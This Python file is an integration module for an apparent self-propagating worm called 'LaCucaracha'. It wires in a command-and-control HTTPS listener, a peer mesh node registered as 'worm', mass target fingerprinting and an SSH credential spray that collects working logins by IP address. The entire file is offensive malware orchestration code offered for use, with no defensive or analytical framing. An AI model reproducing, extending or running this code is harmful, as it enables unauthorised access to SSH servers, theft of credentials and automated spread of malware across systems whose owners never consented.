#!/usr/bin/env python3
"""
LA_CUCARACHA INTEGRATOR — Wires RedLinux modules into worm pipeline
Registers polymorph, ssh_spray, swarm_executor, ghost_agent, neural_mesh
into the existing LaCucaracha main loop.

by 🇭🇷PhonkAlphabet
"""

import logging
import threading
import time
import os
import sys

log = logging.getLogger("integrate")

# Lazy imports to avoid circular issues
POLYMORPH = None
SSH_SPRAY = None
SWARM = None
GHOST = None
MESH = None


def _lazy_imports():
    global POLYMORPH, SSH_SPRAY, SWARM, GHOST, MESH
    if POLYMORPH is None:
        from modules import polymorph as _p
        POLYMORPH = _p
    if SSH_SPRAY is None:
        from modules import ssh_spray as _s
        SSH_SPRAY = _s
    if SWARM is None:
        from modules import swarm_executor as _w
        SWARM = _w
    if GHOST is None:
        from modules import ghost_agent as _g
        GHOST = _g
    if MESH is None:
        from modules import neural_mesh as _n
        MESH = _n


def register_flags(parser):
    """Register new CLI flags on the existing argument parser."""
    _lazy_imports()
    parser.add_argument("--swarm", type=int, nargs="?", const=1000, default=None,
                        help="Run swarm fingerprinting on DB backlog [batch_size]")
    parser.add_argument("--ghost-server", action="store_true",
                        help="Start Ghost C2 HTTPS listener")
    parser.add_argument("--mesh-node", type=int, nargs="?", const=10003, default=None,
                        help="Start mesh gossip node on PORT")
    parser.add_argument("--ssh-spray", type=int, nargs="?", const=200, default=None,
                        help="Run SSH credential spray from DB [limit]")


def handle_flag(args) -> bool:
    """Handle new module flags. Returns True if a module was started."""
    _lazy_imports()

    # Ghost C2 Server
    if getattr(args, "ghost_server", False):
        log.info("Starting Ghost C2 server...")
        engine = GHOST.GhostC2Engine()
        t = threading.Thread(target=engine.start_http_listener, daemon=True)
        t.start()
        log.info(f"Ghost C2 listener on {GHOST.C2_HOST}:{GHOST.C2_PORT}")
        return False  # Don't block — allow other operations

    # Mesh Node
    mesh_port = getattr(args, "mesh_node", None)
    if mesh_port is not None:
        import hashlib
        node_id = f"mesh-{hashlib.md5(os.urandom(8)).hexdigest()[:8]}"
        host_ip = os.environ.get("C2_HOST", "0.0.0.0")
        log.info(f"Starting mesh node {node_id} on port {mesh_port}...")
        node = MESH.MeshNode(node_id, mesh_port=mesh_port)
        node.register_in_mesh(host_ip, mesh_port, os.uname().nodename, "worm")
        t = threading.Thread(
            target=node.start_mesh_listener,
            args=("0.0.0.0", mesh_port),
            daemon=True
        )
        t.start()
        log.info(f"Mesh node {node_id} active on :{mesh_port}")
        return False

    return True


def execute_swarm(batch_size: int = 1000, callback=None) -> dict:
    """Run swarm fingerprinting on DB backlog. Returns summary."""
    _lazy_imports()
    log.info(f"Swarm executor: fingerprinting {batch_size} targets from backlog...")
    swarm = SWARM.SwarmOrchestrator(max_workers=50, timeout=3.0)

    def _cb(done, total, alive):
        if callable(callback):
            callback(done, total, alive)
        elif done % 100 == 0:
            log.info(f"  Swarm: {done}/{total} — {alive} alive")

    results = swarm.fingerprint_db_backlog(limit=batch_size, batch_callback=_cb)
    alive = [r for r in results if r.get("alive")]
    return {
        "total_probed": len(results),
        "alive": len(alive),
        "services_found": len(set(r.get("service", "") for r in alive if r.get("service"))),
    }


def execute_ssh_spray(limit: int = 200) -> dict:
    """Run SSH credential spray from DB targets."""
    _lazy_imports()
    log.info(f"SSH spray: testing {limit} targets from DB...")
    engine = SSH_SPRAY.SprayEngine(max_workers=20, timeout=8.0)
    results = engine.spray_db_targets(limit=limit)
    found = [r for r in results if r.get("found")]
    return {
        "total_probed": len(results),
        "creds_found": len(found),
        "credentials": [{"ip": r["ip"], "creds": r["credentials"]} for r in found],
    }


def register_integration_hooks(args) -> dict:
    """Run all requested module operations and return results."""
    results = {}

    # Run swarm if requested
    if getattr(args, "swarm", None) is not None:
        batch = args.swarm if isinstance(args.swarm, int) else 1000
        results["swarm"] = execute_swarm(batch_size=batch)

    # Run SSH spray if requested
    if getattr(args, "ssh_spray", None) is not None:
        limit = args.ssh_spray if isinstance(args.ssh_spray, int) else 200
        results["ssh_spray"] = execute_ssh_spray(limit=limit)

    return results
